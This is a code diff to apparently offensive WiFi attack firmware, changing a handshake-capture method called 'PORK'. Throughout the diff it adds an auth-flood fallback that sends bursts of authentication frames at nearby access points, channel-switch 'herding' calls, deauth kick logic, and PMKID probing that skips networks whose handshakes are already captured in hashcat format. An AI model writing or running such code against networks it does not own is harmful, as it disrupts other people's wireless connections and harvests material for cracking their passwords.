@@ -185,7 +185,7 @@ void pmkidProbePorkchop(const Ctx& ctx) {
         if (ctx.skipPin(b.bssid)) continue;
         if (b.rssi < ctx.minRssi) continue;
         if (!b.ssid[0]) continue;
-        if (Hc22000::hasPair(b.bssid)) continue;
+        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
         WSLBypasser::sendAuthentication(b.bssid);
         WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
         s_lastProbeMs = now;
@@ -216,21 +216,20 @@ void porkchop(const Ctx& ctx) {
         bumpActivity(b.bssid);
     }
 
-    if (n == 0) return;
-
-    // Global stealth guard. STEALTH pack (bidirKick=false, authFlood=false)
-    // means "zero deauth, ever" - we MUST honor that and not send a single
-    // mgmt frame from this method, regardless of which AP scored highest
-    // or how the lockedBssid* path would normally pick a target. The one
-    // exception is the locked-BSSID path: if we're parked on a target
-    // waiting for M2/M3/M4, the lock is already on the air (we're
-    // hopping with the radio) and dropping kicks here would just stall
-    // the in-flight handshake with no stealth benefit. The user picked
-    // STEALTH to avoid *initiating* kicks, not to abandon a handshake
-    // already in progress.
-    if (!ctx.bidirKick && !ctx.authFlood && !ctx.lockedBssidActive) {
+    if (n == 0) {
+        if (ctx.csaHerd) csaHerd(ctx);
         return;
     }
+
+    // Global stealth guard. STEALTH pack (bidirKick=false, authFlood=false)
+    // means "zero deauth, ever" - honored unconditionally, with NO
+    // exception for the locked-BSSID path below. CSA still runs if the
+    // pack asked for it (STEALTH leaves csaHerd=false).
+    if (!ctx.bidirKick && !ctx.authFlood) {
+        if (ctx.csaHerd) csaHerd(ctx);
+        return;
+    }
+
 
     // COOLDOWN (RADIO menu, seconds): 0 = off / use the method's own
     // built-in default (COOLDOWN_MS). A nonzero user value overrides it,
@@ -285,6 +284,8 @@ void porkchop(const Ctx& ctx) {
                 }
                 *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 2);
             }
+            // Pack knobs that any method must honor (AGGRO/WOLF + PORK).
+            if (ctx.csaHerd) csaHerd(ctx);
             return; // exit before the normal scoring loop
         }
     }
@@ -315,12 +316,24 @@ void porkchop(const Ctx& ctx) {
             bestIdx = (int8_t)i;
         }
     }
-    if (bestIdx < 0) return;
-    // SCORE THR (RADIO menu): skip the tick entirely if even our best
-    // candidate doesn't clear the user's minimum. 0 = score all (any
-    // computeScore() result at or above 0 still attacks), matching the
-    // "0 = score all" default documented in config.h.
-    if (bestScore < ctx.scoreThr) return;
+    if (bestIdx < 0 || bestScore < ctx.scoreThr) {
+        // Nothing to kick this tick — auth-flood fallback (AGGRO/WOLF) + CSA.
+        if (ctx.authFlood) {
+            for (uint8_t i = 0; i < n; i++) {
+                const BeaconSlot& b = ctx.beacons[i];
+                if (b.channel != ctx.channel) continue;
+                if (ctx.isOwnAp(b.bssid)) continue;
+                if (ctx.skipPin(b.bssid)) continue;
+                if (b.rssi < ctx.minRssi) continue;
+                if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;
+                WSLBypasser::sendAuthFlood(b.bssid, 8);
+                *ctx.framesDeauth += 8;
+                break;
+            }
+        }
+        if (ctx.csaHerd) csaHerd(ctx);
+        return;
+    }
 
     const BeaconSlot& target = ctx.beacons[bestIdx];
     uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
@@ -355,6 +368,9 @@ void porkchop(const Ctx& ctx) {
 
     ScoreEntry* se = findOrCreateScore(target.bssid);
     se->lastKickMs = now;
+
+    // Pack knobs: CSA herd (AGGRO etc.) after the focused kick.
+    if (ctx.csaHerd) csaHerd(ctx);
 }
 
 CAP_METHOD_REGISTER("PORK", porkchop, pmkidProbePorkchop, resetPorkchopState)
